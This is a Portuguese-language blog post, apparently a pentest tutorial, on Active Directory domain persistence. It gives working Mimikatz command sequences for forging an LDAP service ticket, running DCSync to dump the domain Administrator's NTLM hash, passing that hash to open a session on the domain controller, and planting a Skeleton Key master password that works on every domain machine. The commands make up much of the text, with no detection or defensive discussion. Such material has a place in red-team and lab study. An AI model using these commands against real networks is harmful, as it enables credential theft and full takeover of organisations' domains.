---
title: "Active Directory - Persistência no Domínio"
tags: [Windows,Active Directory]
categories: ActiveDirectory
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/persistencia.png)

# Considerações Iniciais

Aqui vamos abordar duas técnicas muito utilizadas quando se fala de persistência em ambientes de Active Directory, o ataque de `DCSync` e o `Skeleton Key`

É importante notar que devemos ter acesso do Domain Controller pra realizar esses ataques, uma vez que estão atrelados à pós-exploração.

# DCSYnc

Com o ataque de DCSync vamos ter acessso ao hash do Administrator da DC e consequentemetne a máquina através do PTH

A ideia é parecida com a do Constrained Delegation, só que vamos gerar tickets para o LDAP e através desse ticket gerado pegar o hash do administrator!

Geramos o ticket para LDAP e injetamos ele

```
tgt::ask /user:dbservice /domain:DOMÍNIO /ntlm:HASH_DO_DBSERVICE /ticket:dbservice.kirbi
tgs::s4u /tgt:TGT_dbservice@XXXX_krbtgt~XXXX@XXXX.kirbi /user:Administrator@XXXX /service:time/XXXXX.local|ldap/XXXX.local
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@XXXX@XXXX_ldap~XXXX@XXXX_ALT.kirbi"'
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/persistencia1.png)

Agora executamos o ataque de DCSync e extraimos o hash do administrator

`Invoke-Mimikatz -Command '"lsadump::dcsync /user:usfun\Administrator"'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/persistencia2.png)

Bom, com o hash fica fácil de fazermos um PTH e ter acesso ao DC

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:XXXXXX /ntlm:hash_administrator_dc /run:powershell.exe"'
Enter-PSSession -ComputerName dc
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/persistencia3.png)

Esse foi o ataque de `DCSync`, a partir do Constrained delegation conseguimos gerar tickets para o LDAP e sendo assim extrair o hash ntlm do administrator do DC!

# Skeleton Key

O próximo ataque é chamado de `Skeleton Key`, ele tem esse nome por que vai nos permitir acessar qualquer máquina do domínio com uma senha mestre, a partir do momento que tomamos o controle do DC.

Note que aqui é necessário já estar dentro da máquina, então executando esse ataque após um DCSync, por exemplo

Após ter tomado o controle do DC, com um shell reverso mesmo.

"Baixamos" o mimikatz para a máquina `TEM QUE SER O EXECUTÁVEL` e executamos o ataque

```
privilege::debug
misc::skeleton
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/esc.png)

Pronto! Feito! Agora acessamos qualquer máquina desse domínio com a credencial `mimikatz`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/esc1.png)

É importante ressaltar que esse ataque só pode ser feito uma vez, então caso quando você tente fazer dê erro, pode ser que alguém já tenha realizado nele no domínio.